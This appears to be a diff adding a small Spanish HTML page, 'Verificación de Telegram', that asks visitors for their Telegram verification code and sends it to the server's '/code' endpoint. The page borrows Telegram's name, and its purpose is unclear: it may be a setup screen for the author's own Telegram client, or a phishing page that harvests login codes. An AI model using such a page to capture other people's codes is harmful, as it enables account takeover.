@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Verificación de Telegram</title>
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+<body>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const form = document.getElementById("codeForm");
+            const statusElement = document.getElementById("status");
+            
+            form.addEventListener("submit", async function(event) {
+                event.preventDefault();
+                const code = document.getElementById("code").value;
+    
+                try {
+                    const response = await fetch("/code", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({ code })
+                    });
+    
+                    const data = await response.json();
+                    statusElement.textContent = data.message;
+                } catch (error) {
+                    statusElement.textContent = "Error enviando el código.";
+                }
+            });
+        });
+    </script>
+    
+
+    <div class="container">
+        <h2>Introduce el código de Telegram</h2>
+        <form id="codeForm">
+            <label for="code">Código:</label>
+            <input type="text" id="code" name="code" placeholder="Código de verificación" required>
+            <input type="submit" value="Enviar">
+        </form>
+        <p id="status"></p>
+    </div>
+
+    
+</body>
+</html>
